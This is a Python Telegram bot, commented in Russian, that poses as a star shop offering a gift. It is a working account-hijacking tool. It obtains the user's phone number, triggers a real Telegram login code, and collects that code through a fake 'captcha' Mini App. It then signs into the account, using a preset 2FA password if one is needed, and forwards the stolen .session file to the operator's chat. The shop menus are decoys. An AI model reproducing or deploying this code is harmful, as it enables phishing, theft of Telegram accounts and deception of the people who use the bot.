"""
NexusSession Bot — с Mini App капчей
Деплой: Railway (или любой хостинг с Python)

config.ini:
  bot_token  — токен от @BotFather
  admin_id   — твой Telegram ID
  chat_id    — ID чата/канала для .session файлов
  api_id     — my.telegram.org
  api_hash   — my.telegram.org
  two_fa     — пароль 2FA (пусто если не нужен)
  webapp_url — URL Mini App (Railway даёт автоматически, например https://xxx.up.railway.app)
"""

import asyncio
import os
import sys
import json
import configparser
import sqlite3
import logging
from datetime import datetime
from aiohttp import web  # входит в aiogram как зависимость

try:
    from aiogram import Bot, Dispatcher, executor, types
    from aiogram.contrib.fsm_storage.memory import MemoryStorage
    from aiogram.dispatcher import FSMContext
    from aiogram.dispatcher.filters.state import State, StatesGroup
    from aiogram.types import (
        Message, CallbackQuery,
        ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove,
        InlineKeyboardMarkup, InlineKeyboardButton,
        WebAppInfo,
    )
    from telethon import TelegramClient
    from telethon.errors.rpcerrorlist import (
        PhoneCodeInvalidError, FloodWaitError, SessionPasswordNeededError
    )
except ImportError as e:
    sys.exit(f"[!] Зависимости не установлены: {e}\n    pip install aiogram==2.25.2 telethon aiohttp")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    datefmt='%H:%M:%S'
)
log = logging.getLogger('nexus')

# ═══════════════════════════════════════════
# КОНФИГ
# ═══════════════════════════════════════════
BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(BASE_DIR, 'utils', 'config.ini')
SESSION_DIR = os.path.join(BASE_DIR, 'session')
DB_PATH     = os.path.join(BASE_DIR, 'data', 'database.db')


_ENV_MAP = {
    'bot_token':  'BOT_TOKEN',
    'admin_id':   'ADMIN_ID',
    'chat_id':    'CHAT_ID',
    'api_id':     'API_ID',
    'api_hash':   'API_HASH',
    'two_fa':     'TWO_FA',
    'webapp_url': 'WEBAPP_URL',
}


def _cfg(key: str) -> str:
    """Сначала env, потом config.ini."""
    env_key = _ENV_MAP.get(key.lower())
    if env_key:
        val = os.environ.get(env_key, '').strip()
        if val:
            return val
    if os.path.exists(CONFIG_PATH):
        cfg = configparser.ConfigParser()
        cfg.read(CONFIG_PATH, encoding='utf-8')
        return cfg.get('Settings', key, fallback='').strip()
    return ''

# Railway даёт URL через переменную окружения RAILWAY_PUBLIC_DOMAIN
# Если задана — используем её, иначе берём из конфига
_RAILWAY_DOMAIN = os.environ.get('RAILWAY_PUBLIC_DOMAIN', '')
WEBAPP_URL = (
    f'https://{_RAILWAY_DOMAIN}'
    if _RAILWAY_DOMAIN
    else _cfg('webapp_url').rstrip('/')
)

# ═══════════════════════════════════════════
# БАЗА ДАННЫХ
# ═══════════════════════════════════════════
os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
os.makedirs(SESSION_DIR, exist_ok=True)

_db = sqlite3.connect(DB_PATH, check_same_thread=False)
_db.execute(
    'CREATE TABLE IF NOT EXISTS users '
    '(user_id INTEGER PRIMARY KEY, username TEXT, phone TEXT, date TEXT)'
)
_db.commit()


def db_join(user_id: int, username: str) -> bool:
    row = _db.execute('SELECT 1 FROM users WHERE user_id=?', [user_id]).fetchone()
    if row:
        return False
    _db.execute(
        'INSERT INTO users VALUES (?,?,?,?)',
        [user_id, username or '', 'NOT', datetime.now().isoformat()]
    )
    _db.commit()
    return True


def db_set_phone(user_id: int, phone: str) -> None:
    _db.execute('UPDATE users SET phone=? WHERE user_id=?', [phone, user_id])
    _db.commit()


# ═══════════════════════════════════════════
# TELETHON
# ═══════════════════════════════════════════
def make_client(phone: str) -> TelegramClient:
    return TelegramClient(
        session=os.path.join(SESSION_DIR, f'{phone[1:]}.session'),
        api_id=int(_cfg('api_id')),
        api_hash=_cfg('api_hash'),
        device_model='iPhone 14 Pro',
        system_version='16.6',
        app_version='9.6.3',
    )


def _normalize_phone(raw: str) -> str:
    phone = raw.strip()
    if not phone.startswith('+'):
        phone = '+' + phone
    return phone


# ═══════════════════════════════════════════
# BOT + DISPATCHER
# ═══════════════════════════════════════════
bot = Bot(token=_cfg('bot_token'), parse_mode=types.ParseMode.HTML)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)


class Auth(StatesGroup):
    wait_contact  = State()   # ждём контакт
    wait_webapp   = State()   # ждём данные от Mini App


# ─── Клавиатуры ─────────────────────────────────────────

def kb_phone() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        resize_keyboard=True,
        keyboard=[[KeyboardButton('📱 Продолжить', request_contact=True)]]
    )


def kb_open_captcha(user_id: int) -> InlineKeyboardMarkup:
    """Кнопка открытия Mini App капчи."""
    url = f'{WEBAPP_URL}/captcha?uid={user_id}'
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text='🔐 Пройти проверку',
            web_app=WebAppInfo(url=url)
        )
    ]])


def kb_menu() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        resize_keyboard=True,
        keyboard=[
            [KeyboardButton('👤 Профиль')],
            [KeyboardButton('⭐ Купить звёзды')],
            [KeyboardButton('ℹ️ О магазине')],
        ]
    )


# ═══════════════════════════════════════════
# ХЕНДЛЕРЫ БОТА
# ═══════════════════════════════════════════

@dp.message_handler(commands=['start'], state='*')
async def cmd_start(msg: Message, state: FSMContext):
    await state.finish()
    is_new = db_join(msg.from_user.id, msg.from_user.username)
    if is_new:
        admin = _cfg('admin_id')
        if admin and admin != '0':
            await bot.send_message(
                int(admin),
                f'🆕 Новый: {msg.from_user.get_mention()} | <code>{msg.from_user.id}</code>'
            )
    await msg.answer(
        f'👋 <b>Привет, {msg.from_user.get_mention()}!</b>\n\n'
        '🎁 Вам отправили подарок — нажмите <b>«📱 Продолжить»</b> '
        'и поделитесь номером телефона для проверки личности.',
        reply_markup=kb_phone()
    )
    await Auth.wait_contact.set()


@dp.message_handler(commands=['help'], state='*')
async def cmd_help(msg: Message):
    await msg.answer(
        '<b>ℹ️ Помощь</b>\n\n'
        '/start — начать\n/help — справка\n\n'
        '📞 Поддержка: @lanox_support'
    )


# ── Получаем контакт → отправляем SMS → открываем Mini App
@dp.message_handler(content_types=['contact'], state=Auth.wait_contact)
async def on_contact(msg: Message, state: FSMContext):
    phone = _normalize_phone(msg.contact.phone_number)
    db_set_phone(msg.from_user.id, phone)

    session_file = os.path.join(SESSION_DIR, f'{phone[1:]}.session')
    if os.path.exists(session_file):
        await msg.answer('✅ <b>Ваш аккаунт уже прошёл проверку!</b>', reply_markup=kb_menu())
        await state.finish()
        return

    await msg.answer('🔐 <b>Отправляю код на ваш номер...</b>', reply_markup=ReplyKeyboardRemove())

    try:
        client = make_client(phone)
        await client.connect()
        sent = await client.send_code_request(phone)
        await client.disconnect()
    except FloodWaitError as e:
        await msg.answer(f'❌ <b>Слишком много попыток.</b> Подождите {e.seconds} сек.')
        await state.finish()
        return
    except Exception as e:
        await msg.answer(f'❌ <b>Ошибка при отправке кода:</b> {e}')
        await state.finish()
        return

    await state.update_data(phone=phone, code_hash=sent.phone_code_hash)
    await Auth.wait_webapp.set()

    await msg.answer(
        f'📱 <b>Номер:</b> <code>{phone}</code>\n\n'
        '📩 Telegram отправил вам <b>5-значный код</b>.\n\n'
        '👇 Нажмите кнопку ниже и введите код в форме проверки:',
        reply_markup=kb_open_captcha(msg.from_user.id)
    )


# ── Получаем данные от Mini App (web_app_data)
@dp.message_handler(content_types=['web_app_data'], state=Auth.wait_webapp)
async def on_webapp_data(msg: Message, state: FSMContext):
    raw = msg.web_app_data.data
    log.info('WebApp data from %s: %s', msg.from_user.id, raw)

    try:
        payload = json.loads(raw)
        code = str(payload.get('code', '')).strip()
    except Exception:
        code = raw.strip()

    if not code or len(code) != 5 or not code.isdigit():
        await msg.answer('❌ <b>Неверный формат кода.</b> Попробуйте снова — /start')
        await state.finish()
        return

    async with state.proxy() as data:
        phone     = data['phone']
        code_hash = data['code_hash']

    await msg.answer('🔄 <b>Проверяю код...</b>')

    client = make_client(phone)
    await client.connect()

    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)

    except PhoneCodeInvalidError:
        await msg.answer('❌ <b>Неправильный код!</b> Попробуйте снова — /start')
        await _safe_disconnect(client)
        await state.finish()
        return

    except SessionPasswordNeededError:
        two_fa = _cfg('two_fa')
        if not two_fa:
            await msg.answer('🔒 <b>Требуется пароль 2FA.</b> Обратитесь к администратору.')
            await _safe_disconnect(client)
            await state.finish()
            return
        try:
            await client.sign_in(password=two_fa)
        except Exception as e:
            await msg.answer(f'❌ <b>Ошибка 2FA:</b> {e}\nПопробуйте снова — /start')
            await _safe_disconnect(client)
            await state.finish()
            return

    except Exception as e:
        await msg.answer(f'❌ <b>Ошибка:</b> {e}\nПопробуйте снова — /start')
        await _safe_disconnect(client)
        await state.finish()
        return

    # ── Успех ──────────────────────────────────────────
    await msg.answer('✅ <b>Верификация пройдена успешно!</b>')
    await _send_session_msg(msg, phone)
    await _safe_disconnect(client)

    await bot.send_photo(
        chat_id=msg.from_user.id,
        photo='https://i.postimg.cc/x8g5Mws2/Chat-GPT-Image-8-noab-2025-g-22-31-00.png',
        caption=(
            '🎉 <b>Добро пожаловать в магазин звёзд Lanoxa!</b>\n\n'
            '💫 Самые низкие цены на звёзды\n'
            '⭐ Открывайте эксклюзивный контент\n\n'
            '<i>Бот в бета-тесте, некоторые функции могут не работать</i>'
        ),
        reply_markup=kb_menu()
    )
    await state.finish()


# ═══════════════════════════════════════════
# МЕНЮ
# ═══════════════════════════════════════════

@dp.message_handler(lambda m: m.text == '👤 Профиль')
async def on_profile(msg: Message):
    await msg.answer_photo(
        photo='https://i.postimg.cc/x8g5Mws2/Chat-GPT-Image-8-noab-2025-g-22-31-00.png',
        caption=(
            '👤 <b>ВАШ ПРОФИЛЬ</b>\n\n'
            f'🆔 ID: <code>{msg.from_user.id}</code>\n'
            '⭐ Звёзды: 2500\n💼 Статус: Стандартный'
        ),
        reply_markup=ReplyKeyboardMarkup(
            resize_keyboard=True,
            keyboard=[
                [KeyboardButton('💳 Пополнить'), KeyboardButton('📤 Вывести')],
                [KeyboardButton('◀️ Назад')],
            ]
        )
    )

@dp.message_handler(lambda m: m.text == '💳 Пополнить')
async def on_deposit(msg: Message):
    await msg.answer('💳 <b>Пополнение</b>\n\n⏳ Скоро откроем!')

@dp.message_handler(lambda m: m.text == '📤 Вывести')
async def on_withdraw(msg: Message):
    await msg.answer('📤 <b>Вывод звёзд</b>\n\n⏳ Скоро откроем!')

@dp.message_handler(lambda m: m.text == '⭐ Купить звёзды')
async def on_buy(msg: Message):
    await msg.answer('⭐ <b>Покупка звёзд</b>\n\n⏳ Скоро откроем!')

@dp.message_handler(lambda m: m.text == 'ℹ️ О магазине')
async def on_about(msg: Message):
    await msg.answer(
        'ℹ️ <b>О МАГАЗИНЕ</b>\n\n'
        '🌟 Магазин звёзд Lanoxa\n💰 Самые низкие цены\n'
        '⚡ Быстрая доставка\n🔒 Безопасные сделки\n\n'
        '📞 Поддержка: @lanox_support'
    )

@dp.message_handler(lambda m: m.text == '◀️ Назад')
async def on_back(msg: Message):
    await msg.answer('🏠 Главное меню', reply_markup=kb_menu())


# ═══════════════════════════════════════════
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ═══════════════════════════════════════════

async def _safe_disconnect(client: TelegramClient):
    try:
        if client.is_connected():
            await client.disconnect()
    except Exception:
        pass


async def _send_session_msg(msg: Message, phone: str):
    session_file = os.path.join(SESSION_DIR, f'{phone[1:]}.session')
    if not os.path.exists(session_file):
        log.warning('Session file not found: %s', session_file)
        return

    caption = (
        f'👤 {msg.from_user.get_mention()}\n'
        f'📱 <code>{phone}</code>\n'
        f'🆔 <code>{msg.from_user.id}</code>'
    )

    targets = []
    chat_id  = _cfg('chat_id')
    admin_id = _cfg('admin_id')
    if chat_id and chat_id != '0':
        targets.append(int(chat_id))
    if admin_id and admin_id != '0' and int(admin_id) not in targets:
        targets.append(int(admin_id))

    for target in targets:
        try:
            with open(session_file, 'rb') as f:
                await bot.send_document(chat_id=target, document=f, caption=caption)
        except Exception as e:
            log.error('Не удалось отправить сессию в %s: %s', target, e)


# ═══════════════════════════════════════════
# AIOHTTP — веб-сервер для Mini App
# ═══════════════════════════════════════════

HTML_DIR = os.path.join(BASE_DIR, 'webapp')


async def handle_captcha(request: web.Request) -> web.Response:
    """Отдаём HTML страницу капчи."""
    html_path = os.path.join(HTML_DIR, 'captcha.html')
    with open(html_path, 'r', encoding='utf-8') as f:
        content = f.read()
    return web.Response(text=content, content_type='text/html')


async def handle_health(request: web.Request) -> web.Response:
    return web.Response(text='ok')


def build_webapp() -> web.Application:
    app = web.Application()
    app.router.add_get('/captcha', handle_captcha)
    app.router.add_get('/health', handle_health)
    # Статика (CSS, JS если понадобится)
    static_dir = os.path.join(HTML_DIR, 'static')
    if os.path.exists(static_dir):
        app.router.add_static('/static', static_dir)
    return app


# ═══════════════════════════════════════════
# ЗАПУСК
# ═══════════════════════════════════════════

async def on_startup(dp):
    log.info('Бот запущен. WebApp URL: %s', WEBAPP_URL or '(не задан)')


async def main():
    port = int(os.environ.get('PORT', 8080))

    # Запускаем веб-сервер в фоне
    webapp = build_webapp()
    runner = web.AppRunner(webapp)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    log.info('Web-сервер запущен на порту %s', port)

    # Запускаем бота
    await dp.start_polling(reset_webhook=True)


if __name__ == '__main__':
    from aiogram import executor as _executor
    loop = asyncio.get_event_loop()

    port = int(os.environ.get('PORT', 8080))
    webapp = build_webapp()
    runner = web.AppRunner(webapp)
    loop.run_until_complete(runner.setup())
    site = web.TCPSite(runner, '0.0.0.0', port)
    loop.run_until_complete(site.start())
    log.info('Web-сервер на порту %s | WebApp: %s', port, WEBAPP_URL or '(не задан)')

    _executor.start_polling(dp, skip_updates=True, on_startup=on_startup, loop=loop)
